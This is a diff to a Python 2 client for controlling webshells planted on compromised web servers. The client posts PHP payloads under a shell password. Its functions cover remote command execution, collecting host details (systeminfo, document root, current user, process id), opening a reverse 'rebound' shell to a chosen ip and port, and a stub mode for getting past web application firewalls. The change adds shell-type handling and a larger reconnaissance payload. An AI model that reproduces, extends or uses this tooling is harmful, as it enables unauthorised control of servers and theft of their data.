@@ -84,7 +84,7 @@ def act(cursor):
 
             shell_type = type_check(url)
 
-            exec_webshell(url,password)
+            exec_webshell(url,password,shell_type)
 
         elif action == 'delete':
 
@@ -157,7 +157,7 @@ def action_function():
 
     print 'the function of aim you can do:'
     print '     cmdline'.ljust(20) + ':go to cmd-mode'
-    print '     informatioin packet'.ljust(20) + ':list the information of aim'
+    print '     information packet'.ljust(20) + ':list the information of aim'
     print '     rebound'.ljust(20) + ':rebound a interactive shell'
     print '     waf_mode'.ljust(20) + ':go to waf-mode to pass the waf'
     print '     clear_cahe'.ljust(20) + ':clear the cahe of aim'
@@ -191,16 +191,18 @@ def normal_cmd(url,password,cmd):
     response = urllib2.urlopen(req)
     page = response.readlines()
 
-def exec_webshell(url,password):
+def exec_webshell(url,password,shell_type):
+
+    action_function()
 
     if 'http://' in url:
         pass
     else:
         url = 'http://' + url
 
+
     while True:
 
-        action_function()
         action_shell = raw_input('action shell->')
 
         if action_shell == 'cmdline':
@@ -229,32 +231,39 @@ def exec_webshell(url,password):
                 response = urllib2.urlopen(req)
                 result = response.readlines()
                 path_now = result[len(result)-2]
-                for i in result:
-                    print i
+                for i in range(0,len(result)-2):
+                    print result[i]
 
 
 
         elif action_shell == 'information packet':
 
-            data = "system('echo %cd%',$out);echo $out;"
-            q = {password: data}
-            q = urllib.urlencode(q)
+            if shell_type == 'php':
+                data = "system('echo %cd%',$out);echo $out;"
+                q = {password: data}
+                q = urllib.urlencode(q)
 
-            try:
-                req = urllib2.Request(url, q)
-                response = urllib2.urlopen(req)
-                page = response.readlines()
+                try:
+                    req = urllib2.Request(url, q)
+                    response = urllib2.urlopen(req)
+                    page = response.readlines()
 
-            except:
-                print 'failed!please try waf_mode'
-                continue
+                except:
+                    print 'failed!please try waf_mode'
+                    continue
 
-            data = "system('systeminfo>%cd%\\1.txt',$out);echo $out;"
+                data = '$root = getenv("DOCUMENT_ROOT");$port = getenv("SERVER_PORT");$file = getenv("SCRIPT_NAME");' \
+                       '$ua = getenv("HTTP_USER_AGENT");$method = getenv("REQUEST_METHOD");$protocol = getenv("SERVER_PROTOCOL");' \
+                       '$ID = getmypid();$NAME = get_current_user();' \
+                       'echo $root,"\r\n",$port,"\r\n",$file,"\r\n",$ua,"\r\n",$method,"\r\n",$ID,"\r\n",$NAME;'
+
             q = {password: data}
             q = urllib.urlencode(q)
             req = urllib2.Request(url, q)
             response = urllib2.urlopen(req)
             page = response.readlines()
+            for i in page:
+                print i
 
 
         elif action_shell == 'rebound':
@@ -269,12 +278,25 @@ def exec_webshell(url,password):
             ip = raw_input('ip:')
             port = raw_input('port:')
             data = rebound(ip,port,type)
+
             q = {password: data}
             q = urllib.urlencode(q)
             req = urllib2.Request(url, q)
 
         elif action_shell == 'waf_mode':
-            pass
+
+            print 'waf mode'
+            if shell_type == 'php':
+                pass
+            elif shell_type == 'asp':
+                pass
+            elif shell_type == 'aspx':
+                pass
+            elif shell_type == 'jsp':
+                pass
+            else:
+                print 'there is something wrong with this mode,please try again'
+
         elif action_shell == 'clear_cahe':
             pass
         elif action_shell == 'get_cahe':
